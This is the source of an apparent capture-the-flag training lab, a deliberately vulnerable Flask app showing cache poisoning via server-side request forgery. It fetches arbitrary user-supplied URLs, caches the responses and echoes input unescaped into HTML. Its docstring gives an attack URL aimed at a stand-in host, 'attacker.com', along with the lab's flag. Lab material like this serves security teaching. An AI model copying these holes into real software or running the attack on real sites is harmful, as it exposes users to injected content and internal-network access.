"""
SSRF Lab 15: Cache Poisoning via SSRF
Difficulty: 3 (Advanced)
Points: 100

Description:
Using SSRF to poison application cache.
"""

from flask import Flask, request
import requests

app = Flask(__name__)

CACHE = {}

@app.route('/')
def index():
    """
    VULNERABLE: Cache poisoning via SSRF
    
    Attack Vector:
    1. Set up malicious server with response containing XSS/malicious content
    2. /?cache_key=important&url=http://attacker.com/malicious
    3. Response is cached and served to all users
    4. All subsequent requests to /cache/important return attacker content
    
    Flag: FLAG{ssrf_cache_poisoning_015}
    """
    cache_key = request.args.get('key', '')
    url = request.args.get('url', '')
    content = None
    error = None
    
    # Serve from cache if exists
    if cache_key and cache_key in CACHE:
        content = CACHE[cache_key]
    elif url:
        try:
            response = requests.get(url, timeout=5)
            content = response.text[:500]
            if cache_key:
                CACHE[cache_key] = content  # VULNERABLE: Cache poisoning
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>Cached Content Fetcher</h1>
        <form method="GET">
            <input type="text" name="key" placeholder="Cache Key" value="{cache_key}">
            <input type="text" name="url" placeholder="URL to cache" size="50" value="{url}">
            <button>Fetch & Cache</button>
        </form>
        {f"<pre>{content}</pre>" if content else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5015, debug=False)
